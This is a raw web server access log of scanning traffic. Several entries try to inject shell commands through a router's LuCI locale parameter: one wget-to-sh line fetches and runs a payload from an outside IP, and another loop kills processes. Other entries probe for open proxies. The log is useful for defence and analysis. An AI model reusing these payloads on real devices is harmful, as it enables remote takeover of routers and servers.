185.224.128.59 - - [26/Sep/2024:06:27:04 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 805
154.213.184.25 - - [26/Sep/2024:06:30:49 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
154.213.184.18 - - [26/Sep/2024:07:09:12 +0330] "CONNECT example.com:443 HTTP/1.1" 400 811
95.214.27.169 - - [26/Sep/2024:07:13:09 +0330] "GET / HTTP/1.1" 200 6040
95.214.27.169 - - [26/Sep/2024:07:13:09 +0330] "CONNECT example.com:443 HTTP/1.1" 400 811
95.214.27.169 - - [26/Sep/2024:07:13:09 +0330] "GET / HTTP/1.1" 200 6041
95.214.27.169 - - [26/Sep/2024:07:13:09 +0330] "CONNECT example.com:443 HTTP/1.1" 400 811
52.228.154.198 - - [26/Sep/2024:07:33:42 +0330] "-" 400 2899
154.213.184.25 - - [26/Sep/2024:08:10:02 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
185.224.128.83 - - [26/Sep/2024:08:29:09 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 805
185.224.128.83 - - [26/Sep/2024:08:29:09 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 805
87.120.166.244 - - [26/Sep/2024:08:42:41 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
